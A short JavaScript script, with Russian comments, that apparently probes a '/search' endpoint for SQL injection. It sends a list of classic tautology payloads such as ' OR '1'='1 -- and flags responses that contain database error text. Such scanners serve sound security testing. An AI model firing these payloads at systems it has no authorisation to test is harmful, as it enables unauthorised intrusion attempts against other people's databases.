// sql_test.js

// Функция для отправки запроса и проверки ответа
function testSQLInjection(payload) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "/search?q=" + encodeURIComponent(payload), true); // Измените URL на реальный endpoint
    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4) {
            // Проверка ответа сервера на наличие ошибок
            if (xhr.responseText.includes("SQL syntax") || xhr.responseText.includes("database error")) {
                console.log("Possible SQL Injection vulnerability detected with payload: " + payload);
            }
        }
    };
    xhr.send();
}

// Список тестовых полезных нагрузок для SQL-инъекции
var payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "' OR 1=1#",
    "' OR '1'='1' /*",
    "' OR '1'='1' -- ",
    "' OR 'x'='x",
    "' OR 'x'='x' --",
    "' OR 'x'='x' /*",
];

// Запуск тестирования всех полезных нагрузок
for (var i = 0; i < payloads.length; i++) {
    testSQLInjection(payloads[i]);
}

